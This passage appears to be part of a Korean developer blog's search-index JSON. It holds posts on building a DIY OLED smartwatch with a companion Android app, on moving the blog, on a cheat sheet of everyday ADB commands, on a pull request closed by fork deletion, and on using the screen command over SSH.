리튬배터리 연결충전 모듈 없이 배터리만 연결한 모습이다.체결 완료한 모습충전 모듈을 장착 후 그때그때 충전하여 사용에 불편함이 없도록 구상하였다.배터리 교체수명이 다할 경우 배터리를 교체해주면 된다.레이저와 손전등 기능손전등 기능도 구현하고 레이저도 구현하고 알람기능부터 간단한 업다운 게임과 숫자야구까지 구현하면서 하고 싶었던 아이디어들과 구현하고 싶었던 기능 등 구현하였다. 여러가지 기능을 구현할 때 어려움보다 아이디어를 현실화할 수 있다는 점이 매력적으로 다가와 더 즐기면서 개발할 수 있었다.LED 장착LED 모듈을 장착한 모습Release-Type(Right)과 Proto-Type(Left)추가된 하드웨어 기능은 아래에서 확인할 수 있다.한계점BLE 모듈 장착여러 기능을 넣다보니 디바이스 하나로만 무언가를 구현하기에는 넘을 수 없는 벽이 있었다. GPS모듈과 블루투스 모듈을 사용하여 스마트폰과 연동하려 했으나 이전보다 더 많은 전류를 소모하는 문제에 부딪혔다. 또 7-Segment 디스플레이를 사용하는 것으로 사용자가 기능의 이해를 하는데 어려움이 있는 걸 발견하여 이부분을 해결하고자 초점을 맞췄다.Raspberry Pi WatchSNS에 만든 작품을 올리다보니 여러 사람들이 관심을 가져주었다. 그러다 많은 사람들이 다른 기성품에 관련해서 링크를 보내주면서 관심을 가졌다. 새로운 기성 모델을 찾아서 가지고 있는 코드 기반으로 프로그래밍을 시작하였다.라즈베리파이를 사용하여 손목시계를 구현하려고 시도했었으나 강한 성능에 비해 작은 전원을 써서 구동 시간이 안나와 개발하기에 어려웠다. 다시 기회가 되면 문제를 해결하고 싶다.Raspberry Pi Zero W 로 만든 시계GUI 그리기디자인과 하드웨어 그리고 추후 바라보는 기능들을 고려할 때 선택한 기성품을 찾았으나 기성품에 내장된 모듈을 사용해서 구현된 코드는 존재하지 않았고 비슷한 코드가 있어서 짜집기를 시도하거나 여러 소스를 참고하여도 원하는 결과를 도출하기까지 한계가 있었다. 결국엔 IDE를 닫고 A4 종이와 펜을 들고 손코딩으로 시작하여 처음으로 머릿속에 순서도와 알고리즘을 그려나가며 바닥부터 알고리즘을 설계했다.손코딩 뇌컴파일 눈디버깅이라는 말이 있다. 프로그래밍을 하다보면 컴파일 하기가 귀찮은 경우가 있다. 여러가지를 세팅하고 그에 오는 버그가 두려운 마음에 그냥 머릿속으로 컴파일 하는 경우가 많은데 결국엔 버그를 잡아야 하는 건 마찬가지이다. 어떻게 보면 안 좋은 습관인데 여기서 장점으로 잦은 코드리뷰 습관을 들이다보니 손코딩이 좀 더 편하게 다가오고 코드리뷰하는 것이 재밌게 느껴졌다.보통 코딩을 하면 검색해서 필요한 코드를 가져온다. 검색 방법에 따라 검색 히스토리에 따라 검색 결과가 많이 갈리는데 한동안 필요한 코드를 검색하여 찾는데 도저히 나오지 않았다. 비슷한 모듈이나 비슷한 통신방식을 사용한 라이브러리는 많아 이들을 이용하려고 했지만 내부적으로 레지스터를 건드리면서 설계한 부분이라 갈등이 심했다.타인의 코드를 쓰지 않고 펜과 종이를 들어 원하는 기능을 그림으로 구현하고자 마음 먹었고 이내 알고리즘을 설계해나갔다.글로 알고리즘 구현해보기하드웨어 제한 사항을 극복하기추가 기능Raspberry Pi 시계 만들기이전에 Raspberry Pi에서 구현한 휴대용 NAS를 손목시계에 결합하고 싶은 마음이 언제부터인가 생겼다. 전원 장치와, 무게, 크기 등을 고려했을 때 너무 뜬구름 잡는 생각인거 같아 아이디어랑 기록으로만 남겨두려고 한다.하드웨어 교체디바이스로는 충분하나 만족하지 못하는 부분이 있었다. 메인 보드를 새로 뽑지 않는 이상 기능의 확장은 한계가 있었고 이미 목적에 맞게 뽑힌 보드라 하드웨어적인 추가도 한계가 있엇다. 이때 가장 간단한 하드웨어 추가로 폭 넓은 기능의 확장의 수단이 있었으니 그것은 블루투스 연동이었다. 어느 문서에 따르면 단일 디바이스로 사용하는 것 보다 스마트폰과 연동하여 사용할시 그 기능은 수십배로 확장한다고 한다. 배터리가 이전보다 용량이 비교적 증가하여 이전 디바이스에서 해결하지 못한 블루투스 모듈을 이식하여 기능을 확장하는 것을 다시 시도하였다.BLE 추가이전 손목시계에서 손전등이나 레이저를 장착하면서 같이 블루투스 모듈도 장착을 하였다. 그러나 짧은 구동시간과 유연하지 않는 기능 구현은 해결해야 하는 과제로 남았다. 블루투스를 장착한 가장 대표적인 이유는 당연히 스마트폰과 연동을 하기 위함이다. 기성품인 스마트워치에 기능을 구현해보고자 도전했다.BLE 포기 못하지이전에 해결하지 못한 블루투스 문제를 새로운 디바이스에서 해결할 수 있었다. 배터리도 기존보다 용량이 크고 필요할 때마다 Wake-Up을 제어할 수 있는 점에서 많은 도움이 되었다.App 구현손목시계를 공부하면서 여러 자료를 찾다가 웨어러블과 어플리케이션의 연동에 대해 고민을 갖게 된 일이 있다.개발할 때 알아본 방법으로는 단순하게 디바이스만 구현하거나 스마트폰과 연동하여 앱을 구현하는 방법이 있었다. 디바이스만 구현하게 된다면 디바이스 단독으로 기능들을 구사할 수 있지만 한계가 있었다. 반면에 스마트폰과 연동하면 그 기능이 확장되어 다양한 퍼포먼스를 발휘할 수 있었다.마침 얼마 전 부터 머릿 속에 갖고 있던 기술공부가 안드로이드 공부였다. 아무것도 모르던 고등학교 1학년 때 구글 스토어를 막연하게 구경하다가 어느 한 커플의 100일을 기록한 앱을 보았다. 여기서 감명을 받아 나만의 기억을 남기는 커스텀 할 수 있는 앱을 만들 수 있다는 부분이 인상적이게 다가왔다.하고자 하는 구현이 가능한지 더불어 도움되는 내용을 찾기 위해 학술지에서 관련 논문을 찾던 도중 많은 이들이 저마다 비슷한 아이디어를 기반으로 구현한 것을 확인하였고 무엇보다 시중에 나와있는 기성제품인 스마트워치에서 그 가능성을 의심하지 않고 볼 수 있었다. 이를 기반으로 디자인하고 이전에 개발된 코드들을 수집해나갔다. 막상 생각과 다르게 기능 구현을 위해 첫 앱을 만들었는데 디자인부터 최악이었다.App 개발 입문프로토콜 이슈 잡기손목시계와 스마트폰을 블루투스로 연동하는 가장 주요 모듈로는 블루투스 모듈이 가장 중요하다. 이때 블루투스 4.0 BLE를 사용하는데 서로 연동이 되지 않는 문제에 부딪혔다. 주변에 관련 프로젝트를 하는 지인들도 개발할 때 같은 이슈로 연동하지 못해서 어려움을 겪었다고 한다. 왜 안될까? , 어디서 문제일까?문제의 원인을 파악하고자 하나씩 고려할 수 있는 문제들을 나열하고 하나씩 지워가며 답을 찾아갔다. 답은 가장 가까운 곳에서 찾을 수 있었다.비슷한 기능을 런칭한 개발자에게 자문을 구한 결과 위치 권한과 SDK 버전 업데이트를 신경써야 한다는 답변을 받았다.메신저 알림블루투스를 이용하여 스마트폰에서 알림을 받으면 디바이스로 알려주는 알람 역할입니다.내 폰 찾기디바이스 연동스마트폰에서 디바이스를 찾는 것과 디바이스에서 스마트폰을 찾을 수 있게 기능을 구현하고 있다.정리하며어느 책에 따르면 프로그래머는 아이디어를 스스로 구현할 수 있는 점에서 생명을 탄생시키는 힘이라고 표현한다. 이에 동의하여 개발하면서 더 추가하고 싶은 기능과 개선하는 기능들을 넣어 기능 확장에 초점을 가했다.스마트워치 기능을 구현해보고 싶었다. 개발자의 특권 중 하나는 손 끝에서 머릿속의 그림을 그릴 수 있다는 것이다. 시중에 나와있는 제품들과 비슷한 기능을 만들 수 있고 ProtoType으로 원하는 기능을 접목할 수 있다는 점에서 강점이 된다. Exposure therapy - 스스로를 궁지에 몰아 넣다심리학에 보면 노출치료라는 용어가 있다. 위험의 요소라고 느끼는 환경이나 궁지로 몰아 어떠한 피해 없이 문제의 근원을 치료하는 방법인데 이러한 방법을 다른 의미로 개발하면서 사용하고 있었다.초기에는 워터풀 방식으로 개발을 하였다. 물론 단계가 매우 길었고 스스로 피드백 반영이 자유로웠지만 진행 단계가 진전이 없었다. 후에 애자일 프로세스로 개발을 진행하며 단계마다 피드백을 반영하였다. 기능 하나 하나를 구현할 때 스스로 피드백을 받고 오류를 정정하고 추후 구현할 기능에 반영하고 하나의 프로세스가 돌아갈 때 전력을 쏟아 구현하고자 했다.팀으로 움직이지 않고 현재 혼자 진행하면서 난이도 있는 프로세스에 도전해보기도 하고 기능 보강 및 자동화 등 여러 환경에 노출시켜 한계를 극복하고 문제 해결 능력에 넓은 안목을 가질 수 있었다.전공 수업 시간에 듣길 애자일 프로세스를 제대로 진행하면 살아남는 개발자가 없어 버티기 어렵다한다. 개인이 혼자 진행해서 그런지 숨 쉴 여유가 많았는데 팀으로 움직일 때는 얘기가 조금은 다를 거 같다.OledWatch 프로젝트를 기반으로 SNS에서 좋은 기회를 얻어 오픈소스 프로젝트에 합류해 활동하게 되었다. 협업 방법이나 Git을 자주 사용하여 사용법을 더 깊게 공부할 수 있는 기회의 장이었다." }, { "title": "블로그 이사했습니다.", "url": "/posts/blog-fix/", "categories": "life, blog, web", "tags": "web, jekyll, html, css, js, javascript", "date": "2023-09-09 00:00:00 +0900", "snippet": "블로그 이사합니다.맨 처음 블로그는 기술문서 느낌의 단조로운 곳에서 시작했다. 이때 열심히 써보자고 다짐했는데 사람 심리는 방에 들어오는 것과 같았다. 깨끗하고 보기 좋은 공간에서는 더 오래 머물고 싶은 마음이 생긴다. 방은 휴식과 안정감이 있는 공간으로 인식된다. 블로그도 마찬가지이다. 휴식과 안정이 있어야 하는데 이전 블로그는 다시 마주치고 싶지 ...", "content": "블로그 이사합니다.맨 처음 블로그는 기술문서 느낌의 단조로운 곳에서 시작했다. 이때 열심히 써보자고 다짐했는데 사람 심리는 방에 들어오는 것과 같았다. 깨끗하고 보기 좋은 공간에서는 더 오래 머물고 싶은 마음이 생긴다. 방은 휴식과 안정감이 있는 공간으로 인식된다. 블로그도 마찬가지이다. 휴식과 안정이 있어야 하는데 이전 블로그는 다시 마주치고 싶지 않을 정도로 너무 신경 쓰지 않은 모습이 많았다. 그러나 당시에 내가 만든 블로그 치고는 적어도 아무것도 모르는 상태로 스스로 꽤 만족하였지만 시간이 지난 지금은 피하고 싶은 블로그였다. 너무 단순하고 신경 쓰지 않은 블로그는 주인 자체도 멀리 하는 관리 소홀과 방치로 이어졌다.이전에 쓰던 블로그 대문이었다. 초등학생 때 우연히 본 고사성어 이야기에 흥미가 생겨 찾아본 이야기인데 어느 한 노인의 지혜에서 시작된 장대한 시작을 나타낸다. 첫 블로그 역시 큰 꿈을 갖고 시작하긴 했지만 관리도 잘 안하고 보관만 하는 물품이 되었다.추후 티스토리나 네이버 블로그로 조금씩을 손을 뻗었지만 결과는 비슷하였다.그때 든 생각이 블로그를 밑바닥부터 만들어보자 생각하였고 이전에 있던 블로그를 과감하게 Shutdown 하였다. (아 물론 썼던 마크다운 파일은 보관하고 있다. 옮겨야 하니까.. )그렇게 알아보던 중 해당 블로그 역시 사용하고 있는 뼈대인 해당 정적 사이트 생성기가 있었고 많은 사람들이 이를 기반으로 테마를 만들거나 GitBlog 를 배포하는 걸 볼 수 있었다.이에 맞춰 블로그 대공사를 시작하였고 아무도 오지 않는 가게를 잠시 닫고 새단장을 준비하였다.블로그 대공사블로그 테마를 바꾸려고 예전부터 고심해왔다. 나중에 나중에 하면서 미뤘는데 최근 연구하고 분석한 것들을 기록하려다보니까 먼지 쌓인 블로그와 마주할 기회가 많았다.처음은 네이버 블로그를 옮겼으나 git 을 쓰지 않기도 하고 일상 라이프를 올리는 블로그 느낌이 강해서 이쪽 사람들이 많이 쓰는 티스토리로 옮겼다. 티스토리는 약간의 커스텀도 가능해서 좀 이것저것 봤는데 아무래도 지금까지 써놓은 md 파일들을 백업하는 게 가장 컸다. 그래서 다시 GitBlog로 돌아와 현재 가진 마크다운 파일들을 유지한 채 블로그를 만들기로 생각했다. git 을 쓰고 현재 써왔던 수많은 md 파일들을 백업하려면 GitBlog 외에는 사실 답이 없었다.영업 시작합니다.웬만한 것들은 다 수정하고 원하는 그림이 얼추보여서 Deploy를 시작하였다. 사실 배포하는 것도 쉽지 않았다. 그래도 코드 자체가 공개형식이라 다른 사람들 저장소를 참고하여 나의 저장소가 뭐가 잘못되었는지 알 수 있었다.이전 블로그에선 쉽지 않았던 댓글 기능도 구현하였고 꽤 유명한 스타트업에서 사용하는 기술블로그 느낌을 최대한 따라가려고 수정하였다.앞으로는 매번 방문할 때 글을 쓰고 싶은 마음이 드는 블로그를 만들어보려고 한다." }, { "title": "유용한 ADB 명령어", "url": "/posts/adb-command/", "categories": "android, mobile", "tags": "mobile, linux, android", "date": "2023-09-08 00:00:00 +0900", "snippet": "ADB 명령어 모음Adb help$ adb help // List all comandsAdb Server$ adb kill-server$ adb start-server Adb Reboot$ adb reboot$ adb reboot recovery $ adb reboot-bootloader$ adb root //restarts adb with root ...", "content": "ADB 명령어 모음Adb help$ adb help // List all comandsAdb Server$ adb kill-server$ adb start-server Adb Reboot$ adb reboot$ adb reboot recovery $ adb reboot-bootloader$ adb root //restarts adb with root permissionsShell$ adb shell // Open or run commands in a terminal on the host Android device.Devices$ adb usb$ adb devices //show devices attached$ adb devices -l //devices (product/model)$ adb connect ip_address_of_deviceGet device android version$ adb shell getprop ro.build.version.release LogCat$ adb logcat$ adb logcat -c // clear // The parameter -c will clear the current logs on the device.$ adb logcat -d &gt; [path_to_file] // Save the logcat output to a file on the local system.$ adb bugreport &gt; [path_to_file] // Will dump the whole device information like dumpstate, dumpsys and logcat output.Files$ adb push [source] [destination] // Copy files from your computer to your phone.$ adb pull [device file location] [local file location] // Copy files from your phone to your computer.App install$ adb -e install path/to/app.apk-d - directs command to the only connected USB device...-e - directs command to the only running emulator...-s &lt;serial number&gt; ...-p &lt;product name or path&gt; ...The flag you decide to use has to come before the actual adb command:$ adb devices | tail -n +2 | cut -sf 1 | xargs -IX adb -s X install -r com.myAppPackage // Install the given app on all connected devices.Uninstalling app from device$ adb uninstall com.myAppPackage$ adb uninstall &lt;app .apk name&gt;$ adb uninstall -k &lt;app .apk name&gt; -&gt; \"Uninstall .apk withour deleting data\"$ adb shell pm uninstall com.example.MyApp$ adb shell pm clear [package] // Deletes all data associated with a package.$ adb devices | tail -n +2 | cut -sf 1 | xargs -IX adb -s X uninstall com.myAppPackage //Uninstall the given app from all connected devicesUpdate app$ adb install -r yourApp.apk // -r means re-install the app and keep its data on the device.$ adb install –k &lt;.apk file path on computer&gt; Home button$ adb shell am start -W -c android.intent.category.HOME -a android.intent.action.MAINActivity Manager$ adb shell am start -a android.intent.action.VIEW$ adb shell am broadcast -a 'my_action'$ adb shell am start -a android.intent.action.CALL -d tel:+972527300294 // Make a call// Open send sms screen with phone number and the message:$ adb shell am start -a android.intent.action.SENDTO -d sms:+972527300294 --es sms_body \"Test --ez exit_on_sent falseReset permissions$ adb shell pm reset-permissions -p your.app.package $ adb shell pm grant [packageName] [ Permission] // Grant a permission to an app. $ adb shell pm revoke [packageName] [ Permission] // Revoke a permission from an app.Emulate device$ adb shell wm size 2048x1536$ adb shell wm density 288And reset to default$ adb shell wm size reset$ adb shell wm density resetPrint text$ adb shell input text 'Wow, it so cool feature'Screenshot$ adb shell screencap -p /sdcard/screenshot.png$ adb shellshell@ $ screencap /sdcard/screen.pngshell@ $ exit$ adb pull /sdcard/screen.png$ adb shell screenrecord /sdcard/NotAbleToLogin.mp4$ adb shellshell@ $ screenrecord --verbose /sdcard/demo.mp4(press Control + C to stop)shell@ $ exit$ adb pull /sdcard/demo.mp4Key event$ adb shell input keyevent 3 // Home btn$ adb shell input keyevent 4 // Back btn$ adb shell input keyevent 5 // Call$ adb shell input keyevent 6 // End call$ adb shell input keyevent 26 // Turn Android device ON and OFF. It will toggle device to on/off status.$ adb shell input keyevent 27 // Camera$ adb shell input keyevent 64 // Open browser$ adb shell input keyevent 66 // Enter$ adb shell input keyevent 67 // Delete (backspace)$ adb shell input keyevent 207 // Contacts$ adb shell input keyevent 220 / 221 // Brightness down/up$ adb shell input keyevent 277 / 278 /279 // Cut/Copy/Paste0 --&gt; \"KEYCODE_0\" 1 --&gt; \"KEYCODE_SOFT_LEFT\" 2 --&gt; \"KEYCODE_SOFT_RIGHT\" 3 --&gt; \"KEYCODE_HOME\" 4 --&gt; \"KEYCODE_BACK\" 5 --&gt; \"KEYCODE_CALL\" 6 --&gt; \"KEYCODE_ENDCALL\" 7 --&gt; \"KEYCODE_0\" 8 --&gt; \"KEYCODE_1\" 9 --&gt; \"KEYCODE_2\" 10 --&gt; \"KEYCODE_3\" 11 --&gt; \"KEYCODE_4\" 12 --&gt; \"KEYCODE_5\" 13 --&gt; \"KEYCODE_6\" 14 --&gt; \"KEYCODE_7\" 15 --&gt; \"KEYCODE_8\" 16 --&gt; \"KEYCODE_9\" 17 --&gt; \"KEYCODE_STAR\" 18 --&gt; \"KEYCODE_POUND\" 19 --&gt; \"KEYCODE_DPAD_UP\" 20 --&gt; \"KEYCODE_DPAD_DOWN\" 21 --&gt; \"KEYCODE_DPAD_LEFT\" 22 --&gt; \"KEYCODE_DPAD_RIGHT\" 23 --&gt; \"KEYCODE_DPAD_CENTER\" 24 --&gt; \"KEYCODE_VOLUME_UP\" 25 --&gt; \"KEYCODE_VOLUME_DOWN\" 26 --&gt; \"KEYCODE_POWER\" 27 --&gt; \"KEYCODE_CAMERA\" 28 --&gt; \"KEYCODE_CLEAR\" 29 --&gt; \"KEYCODE_A\" 30 --&gt; \"KEYCODE_B\" 31 --&gt; \"KEYCODE_C\" 32 --&gt; \"KEYCODE_D\" 33 --&gt; \"KEYCODE_E\" 34 --&gt; \"KEYCODE_F\" 35 --&gt; \"KEYCODE_G\" 36 --&gt; \"KEYCODE_H\" 37 --&gt; \"KEYCODE_I\" 38 --&gt; \"KEYCODE_J\" 39 --&gt; \"KEYCODE_K\" 40 --&gt; \"KEYCODE_L\" 41 --&gt; \"KEYCODE_M\" 42 --&gt; \"KEYCODE_N\" 43 --&gt; \"KEYCODE_O\" 44 --&gt; \"KEYCODE_P\" 45 --&gt; \"KEYCODE_Q\" 46 --&gt; \"KEYCODE_R\" 47 --&gt; \"KEYCODE_S\" 48 --&gt; \"KEYCODE_T\" 49 --&gt; \"KEYCODE_U\" 50 --&gt; \"KEYCODE_V\" 51 --&gt; \"KEYCODE_W\" 52 --&gt; \"KEYCODE_X\" 53 --&gt; \"KEYCODE_Y\" 54 --&gt; \"KEYCODE_Z\" 55 --&gt; \"KEYCODE_COMMA\" 56 --&gt; \"KEYCODE_PERIOD\" 57 --&gt; \"KEYCODE_ALT_LEFT\" 58 --&gt; \"KEYCODE_ALT_RIGHT\" 59 --&gt; \"KEYCODE_SHIFT_LEFT\" 60 --&gt; \"KEYCODE_SHIFT_RIGHT\" 61 --&gt; \"KEYCODE_TAB\" 62 --&gt; \"KEYCODE_SPACE\" 63 --&gt; \"KEYCODE_SYM\" 64 --&gt; \"KEYCODE_EXPLORER\" 65 --&gt; \"KEYCODE_ENVELOPE\" 66 --&gt; \"KEYCODE_ENTER\" 67 --&gt; \"KEYCODE_DEL\" 68 --&gt; \"KEYCODE_GRAVE\" 69 --&gt; \"KEYCODE_MINUS\" 70 --&gt; \"KEYCODE_EQUALS\" 71 --&gt; \"KEYCODE_LEFT_BRACKET\" 72 --&gt; \"KEYCODE_RIGHT_BRACKET\" 73 --&gt; \"KEYCODE_BACKSLASH\" 74 --&gt; \"KEYCODE_SEMICOLON\" 75 --&gt; \"KEYCODE_APOSTROPHE\" 76 --&gt; \"KEYCODE_SLASH\" 77 --&gt; \"KEYCODE_AT\" 78 --&gt; \"KEYCODE_NUM\" 79 --&gt; \"KEYCODE_HEADSETHOOK\" 80 --&gt; \"KEYCODE_FOCUS\" 81 --&gt; \"KEYCODE_PLUS\" 82 --&gt; \"KEYCODE_MENU\" 83 --&gt; \"KEYCODE_NOTIFICATION\" 84 --&gt; \"KEYCODE_SEARCH\" 85 --&gt; \"KEYCODE_MEDIA_PLAY_PAUSE\"86 --&gt; \"KEYCODE_MEDIA_STOP\"87 --&gt; \"KEYCODE_MEDIA_NEXT\"88 --&gt; \"KEYCODE_MEDIA_PREVIOUS\"89 --&gt; \"KEYCODE_MEDIA_REWIND\"90 --&gt; \"KEYCODE_MEDIA_FAST_FORWARD\"91 --&gt; \"KEYCODE_MUTE\"92 --&gt; \"KEYCODE_PAGE_UP\"93 --&gt; \"KEYCODE_PAGE_DOWN\"94 --&gt; \"KEYCODE_PICTSYMBOLS\"122 --&gt; \"KEYCODE_MOVE_HOME\"123 --&gt; \"KEYCODE_MOVE_END\"// https://developer.android.com/reference/android/view/KeyEvent.htmlShPref# replace org.example.app with your application id# Add a value to default shared preferences.$ adb shell 'am broadcast -a org.example.app.sp.PUT --es key key_name --es value \"hello world!\"'# Remove a value to default shared preferences.$ adb shell 'am broadcast -a org.example.app.sp.REMOVE --es key key_name'# Clear all default shared preferences.$ adb shell 'am broadcast -a org.example.app.sp.CLEAR --es key key_name'# It's also possible to specify shared preferences file.$ adb shell 'am broadcast -a org.example.app.sp.PUT --es name Game --es key level --ei value 10'# Data types$ adb shell 'am broadcast -a org.example.app.sp.PUT --es key string --es value \"hello world!\"'$ adb shell 'am broadcast -a org.example.app.sp.PUT --es key boolean --ez value true'$ adb shell 'am broadcast -a org.example.app.sp.PUT --es key float --ef value 3.14159'$ adb shell 'am broadcast -a org.example.app.sp.PUT --es key int --ei value 2015'$ adb shell 'am broadcast -a org.example.app.sp.PUT --es key long --el value 9223372036854775807'# Restart application process after making changes$ adb shell 'am broadcast -a org.example.app.sp.CLEAR --ez restart true'Monkey$ adb shell monkey -p com.myAppPackage -v 10000 -s 100 // monkey tool is generating 10.000 random events on the real devicePaths/data/data/&lt;package&gt;/databases (app databases)/data/data/&lt;package&gt;/shared_prefs/ (shared preferences)/data/app (apk installed by user)/system/app (pre-installed APK files)/mmt/asec (encrypted apps) (App2SD)/mmt/emmc (internal SD Card)/mmt/adcard (external/Internal SD Card)/mmt/adcard/external_sd (external SD Card)$ adb shell ls (list directory contents)$ adb shell ls -s (print size of each file)$ adb shell ls -R (list subdirectories recursively)Device onformation$ adb get-statе (print device state)$ adb get-serialno (get the serial number)$ adb shell dumpsys iphonesybinfo (get the IMEI)$ adb shell netstat (list TCP connectivity)$ adb shell pwd (print current working directory)$ adb shell dumpsys battery (battery status)$ adb shell pm list features (list phone features)$ adb shell service list (list all services)$ adb shell dumpsys activity &lt;package&gt;/&lt;activity&gt; (activity info)$ adb shell ps (print process status)$ adb shell wm size (displays the current screen resolution)dumpsys window windows | grep -E 'mCurrentFocus|mFocusedApp' (print current app's opened activity)Package info$ adb shell list packages (list package names)$ adb shell list packages -r (list package name + path to apks)$ adb shell list packages -3 (list third party package names)$ adb shell list packages -s (list only system packages)$ adb shell list packages -u (list package names + uninstalled)$ adb shell dumpsys package packages (list info on all apps)$ adb shell dump &lt;name&gt; (list info on one package)$ adb shell path &lt;package&gt; (path to the apk file)Configure Settings Commands$ adb shell dumpsys battery set level &lt;n&gt; (change the level from 0 to 100)$ adb shell dumpsys battery set status&lt;n&gt; (change the level to unknown, charging, discharging, not charging or full)$ adb shell dumpsys battery reset (reset the battery)$ adb shell dumpsys battery set usb &lt;n&gt; (change the status of USB connection. ON or OFF)$ adb shell wm size WxH (sets the resolution to WxH)Device Related Commands$ adb reboot-recovery (reboot device into recovery mode)$ adb reboot fastboot (reboot device into recovery mode)$ adb shell screencap -p \"/path/to/screenshot.png\" (capture screenshot)$ adb shell screenrecord \"/path/to/record.mp4\" (record device screen)$ adb backup -apk -all -f backup.ab (backup settings and apps)$ adb backup -apk -shared -all -f backup.ab (backup settings, apps and shared storage)$ adb backup -apk -nosystem -all -f backup.ab (backup only non-system apps)$ adb restore backup.ab (restore a previous backup)$ adb shell am start|startservice|broadcast &lt;INTENT&gt;[&lt;COMPONENT&gt;]-a &lt;ACTION&gt; e.g. android.intent.action.VIEW-c &lt;CATEGORY&gt; e.g. android.intent.category.LAUNCHER (start activity intent)$ adb shell am start -a android.intent.action.VIEW -d URL (open URL)$ adb shell am start -t image/* -a android.intent.action.VIEW (opens gallery)Logs$ adb logcat [options] [filter] [filter] (view device log)$ adb bugreport (print bug reports)Other$ adb backup // Create a full backup of your phone and save to the computer.$ adb restore // Restore a backup to your phone.$ adb sideload // Push and flash custom ROMs and zips from your computer.fastboot devices// Check connection and get basic information about devices connected to the computer.// This is essentially the same command as adb devices from earlier. //However, it works in the bootloader, which ADB does not. Handy for ensuring that you have properly established a connection.Shared Preferences# replace org.example.app with your application id# Add a value to default shared preferences.$ adb shell 'am broadcast -a org.example.app.sp.PUT --es key key_name --es value \"hello world!\"'# Remove a value to default shared preferences.$ adb shell 'am broadcast -a org.example.app.sp.REMOVE --es key key_name'# Clear all default shared preferences.$ adb shell 'am broadcast -a org.example.app.sp.CLEAR --es key key_name'# It's also possible to specify shared preferences file.$ adb shell 'am broadcast -a org.example.app.sp.PUT --es name Game --es key level --ei value 10'# Data types$ adb shell 'am broadcast -a org.example.app.sp.PUT --es key string --es value \"hello world!\"'$ adb shell 'am broadcast -a org.example.app.sp.PUT --es key boolean --ez value true'$ adb shell 'am broadcast -a org.example.app.sp.PUT --es key float --ef value 3.14159'$ adb shell 'am broadcast -a org.example.app.sp.PUT --es key int --ei value 2015'$ adb shell 'am broadcast -a org.example.app.sp.PUT --es key long --el value 9223372036854775807'# Restart application process after making changes$ adb shell 'am broadcast -a org.example.app.sp.CLEAR --ez restart true'Few bash snippets@Source (https://jonfhancock.com/bash-your-way-to-better-android-development-1169bc3e0424)Using tail -n//Use tail to remove the first line. Actually two lines. The first one is just a newline. The second is “List of devices attached.”$ adb devices | tail -n +2Using cut -sf// Cut the last word and any white space off the end of each line.$ adb devices | tail -n +2 | cut -sf -1Using xargs -I// Given the -I option, xargs will perform an action for each line of text that we feed into it.// We can give the line a variable name to use in commands that xargs can execute.$ adb devices | tail -n +2 | cut -sf -1 | xargs -I X echo X aw yissThree options below together// Will print android version of all connected devicesad$ b devices | tail -n +2 | cut -sf -1 | xargs -I X adb -s X shell getprop ro.build.version.release Using aliasExample 1$ alias tellMeMore=echo tellMeMore \"hi there\" Output =&gt; hi thereExample 2// Define alias$ alias apkinstall=\"adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X install -r $1\"// And you can use it later $ apkinstall ~/Downloads/MyAppRelease.apk // Install an apk on all devicesExample 3$ alias rmapp=\"adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X uninstall $1\"rmapp com.example.myapp // Uninstall a package from all devicesExample 4$ alias clearapp=\"adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell pm clear $1\"clearapp com.example.myapp // Clear data on all devices (leave installed)Example 5$ alias startintent=\"adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell am start $1\"startintent https://twitter.com/JonFHancock // Launch a deep link on all devicesSetting up your .bash_profileFinally, to make this all reusable even after rebooting your computer (aliases only last through the current session), we have to add these to your .bash_profile. You might or might not already have a .bash_profile, so let’s make sure we append to it rather than overwriting it. Just open a terminal, and run the following commandtouch .bash_profile &amp;&amp; open .bash_profileThis will create it if it doesn’t already exist, and open it in a text editor either way. Now just copy and paste all of the aliases into it, save, and close.alias startintent=\"adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell am start $1\"alias apkinstall=\"adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X install -r $1\"alias rmapp=\"adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X uninstall $1\"alias clearapp=\"adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell pm clear $1\"Reference출처는 여기를 참고했습니다." }, { "title": "Fork 삭제로 인한 Pull request CLOSE", "url": "/posts/PR-close-fork/", "categories": "git, develop", "tags": "git, Software Developer", "date": "2023-09-07 00:00:00 +0900", "snippet": "Fork 삭제로 인한 Pull request CLOSE보통 PR을 진행하고 있을 때 Fork를 만들고서 수정사항을 요청한다.그런데 최근 이상한 일을 겪었다.진행중이던 PR이 닫힌 것인데 누가 닫은지 나타나지도 않고 또 타임라인에 반영되지 않은 것이다.메인테이너가 닫은 줄 알고 물어봤더니 메인테이너도 모른다고 답하였다.이런 것에 궁금증이 발동하여 git...", "content": "Fork 삭제로 인한 Pull request CLOSE보통 PR을 진행하고 있을 때 Fork를 만들고서 수정사항을 요청한다.그런데 최근 이상한 일을 겪었다.진행중이던 PR이 닫힌 것인데 누가 닫은지 나타나지도 않고 또 타임라인에 반영되지 않은 것이다.메인테이너가 닫은 줄 알고 물어봤더니 메인테이너도 모른다고 답하였다.이런 것에 궁금증이 발동하여 git remote/local log를 전부 찾아서 어디서 잘못되었나 살펴보니 원격에서 Fork를 삭제하면서 같이 PR이 닫힌 것으로 확인되었다.이때 머리속을 스치며 바로 미안해졌다.. 내 잘못인데 메인테이너에게 다짜고짜 따졌으니..곧바로 메인테이너에게 사과하였고 메인테이너는 대수롭지 않게 여기고 넘어갈 수 있었다.이를 참고하면서 나의 엉뚱한 PR 소동은 끝나고 결과는 해피엔딩으로 끝났다." }, { "title": "ssh 환경에서 터미널을 종료해도 계속 스크립트를 실행하는 방법", "url": "/posts/screen-command/", "categories": "ssh, linux", "tags": "Software Developer", "date": "2023-09-05 00:00:00 +0900", "snippet": "screen 명령어$ sudo apt install screen -yssh 환경에서 터미널을 종료하면 실행중인 스크립트가 종료되는데 해당 명령어를 사용하여 스크립트를 실행하면 터미널을 종료해도 계속 스크립트가 실행된다.$ screen -list # 현재 활성화된 screen 세션 확인하기확인된 세션으로 진입하기$ screen -r session nam...", "content": "screen 명령어$ sudo apt install screen -yssh 환경에서 터미널을 종료하면 실행중인 스크립트가 종료되는데 해당 명령어를 사용하여 스크립트를 실행하면 터미널을 종료해도 계속 스크립트가 실행된다.$ screen -list # 현재 활성화된 screen 세션 확인하기확인된 세션으로 진입하기$ screen -r session name # 활성화된 